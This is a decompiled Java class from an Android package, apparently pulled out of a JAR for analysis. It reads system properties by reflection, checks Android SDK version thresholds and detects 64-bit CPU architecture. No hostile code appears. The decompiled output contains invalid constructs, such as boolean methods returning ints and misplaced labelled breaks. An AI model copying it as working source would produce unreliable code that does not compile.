package com.vvt.aa;

import android.os.Build.VERSION;
import com.vvt.ag.b;
import java.lang.reflect.Method;

public class a
{
  private static String a(String paramString)
  {
    String str1 = System.getProperty(paramString);
    boolean bool1 = b.a(str1);
    if (bool1) {}
    String str2;
    for (Object localObject1 = "android.os.SystemProperties";; str2 = str1)
    {
      try
      {
        localObject1 = Class.forName((String)localObject1);
        Object localObject2 = "get";
        int i = 1;
        Object localObject3 = new Class[i];
        Class localClass = String.class;
        localObject3[0] = localClass;
        localObject2 = ((Class)localObject1).getMethod((String)localObject2, (Class[])localObject3);
        i = 1;
        localObject3 = new Object[i];
        localObject3[0] = paramString;
        localObject1 = ((Method)localObject2).invoke(localObject1, (Object[])localObject3);
        localObject1 = (String)localObject1;
      }
      catch (Exception localException)
      {
        for (;;)
        {
          boolean bool2;
          str2 = str1;
        }
      }
      bool2 = b.a((String)localObject1);
      if (bool2) {
        localObject1 = "";
      }
      return (String)localObject1;
    }
  }
  
  public static boolean a()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 23;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean b()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 21;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean c()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 19;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean d()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 18;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean e()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 16;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean f()
  {
    int i = Build.VERSION.SDK_INT;
    int k = 14;
    if (i >= k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public static boolean g()
  {
    boolean bool1 = false;
    String str1 = null;
    boolean bool2 = b();
    String str2;
    if (bool2)
    {
      str2 = i();
      boolean bool3 = b.a(str2);
      if (bool3) {
        break label98;
      }
      String str3 = "aarch64";
      bool3 = str2.equalsIgnoreCase(str3);
      if (!bool3)
      {
        str3 = "64";
        bool2 = str2.contains(str3);
        if (!bool2) {
          break label82;
        }
      }
      str2 = j();
      str3 = "64";
      bool2 = str2.contains(str3);
      if (bool2) {
        bool1 = true;
      }
    }
    for (;;)
    {
      return bool1;
      label82:
      str1 = j();
      str2 = "64";
      bool1 = str1.contains(str2);
      continue;
      label98:
      str1 = j();
      str2 = "64";
      bool1 = str1.contains(str2);
    }
  }
  
  public static String h()
  {
    return a("android.os.SystemProperties");
  }
  
  private static String i()
  {
    return a("os.arch");
  }
  
  private static String j()
  {
    return a("ro.product.cpu.abilist");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/aa/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */